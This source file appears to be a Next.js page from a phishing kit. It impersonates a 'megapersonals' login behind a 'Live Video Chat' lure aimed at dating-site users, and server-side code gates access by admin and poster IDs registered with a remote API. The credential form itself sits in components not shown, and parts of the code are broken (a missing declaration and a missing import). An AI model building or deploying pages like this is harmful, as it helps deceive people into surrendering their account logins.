import { useState } from "react";
import Login from "../../../components/Login";
import Webcam from "react-webcam";
import { API_URL, site } from "../../../config";
import Image from "next/image";
import LoginForm from "../../../components/LoginForm";

 IconPhone = () => {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="25"
      height="25"
      fill="#fff"
      version="1"
      viewBox="0 0 512 512"
    >
      <path
        d="M2252 4649c-452-21-906-98-1252-210-339-111-573-241-746-413-100-101-154-177-195-275-55-132-59-178-59-670 0-293 4-469 11-503 28-134 121-253 243-313 104-52 176-57 659-53 400 4 414 5 476 28 130 47 239 159 283 290 19 60 22 91 26 375l4 309 32 31c34 35 117 64 342 121 183 46 319 64 484 64s301-18 484-64c232-59 308-86 342-120l32-32 4-309c4-285 7-315 27-377 42-129 152-240 286-289 57-22 78-23 472-27 483-4 555 1 659 53 122 60 215 179 243 313 7 34 11 210 11 503 0 492-4 538-59 670-84 200-294 400-566 536-533 269-1370 404-2243 362z"
        transform="matrix(.1 0 0 -.1 0 512)"
      ></path>
    </svg>
  );
};



export default function Home() {
  const [showForm, setShowForm] = useState(false);
  const [showCall, setShowCall] = useState(true);

  // const videoConstraints = {
  //   width: 1262,
  //   height: 1080,
  //   facingMode: "user",
  // };

  return (
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
    {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
      Waiting...
    </h1> */}
    <Webcam
      audio={false}
      className="object-cover h-screen w-screen lg:w-auto"
      // height={1080}
      // width={1262}
      // screenshotFormat="image/jpeg"
      // videoConstraints={videoConstraints}
    />

    <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
      
       
          {!showForm ? (
        <LoginForm setShowForm={setShowForm}/>
          ) : (
            <SecurityModal/>
          )}
        
      
    </div>
  </div>
  );

  // return (
  //   <div className="relative h-screen w-screen flex flex-col justify-center items-center">
  //     <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
  //       Waiting...
  //     </h1>
  //     <Webcam
  //       audio={false}
  //       className="object-cover h-screen w-screen lg:w-auto"
  //       // height={1080}
  //       // width={1262}
  //       // screenshotFormat="image/jpeg"
  //       // videoConstraints={videoConstraints}
  //     />

  //     <div className="absolute flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
  //       <div className=" bg-white md:w-[420px] py-4 shadow-around rounded-lg">
  //         {!showForm ? (
  //           <div className="flex flex-col items-center">
  //             <div className="px-8 md:px-12">
  //               <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
  //                 Live Video Chat
  //               </h3>

  // <p className="mt-[15px] text-lg leading-tight font-medium ">
  //   Login with megapersonals and enjoy with{" "}
  //   <span className="text-[#2b044d] font-bold">
  //     Private Live Video Chat
  //   </span>{" "}
  //   your dating partner.
  // </p>
  //             </div>

  //             <div className="mt-[35px] mb-3 px-4 md:px-12 flex w-full font-serif">
  // <button
  //   className="bg-[#990033] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
  //   onClick={() => setShowForm(true)}
  // >
  //   <div className="bg-white rounded-md w-10 h-10"></div>
  //   <p className="">Login with megapersonals</p>
  // </button>
  //             </div>
  //           </div>
  //         ) : (
  //           <Login />
  //         )}
  //       </div>
  //     </div>
  //   </div>
  // );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
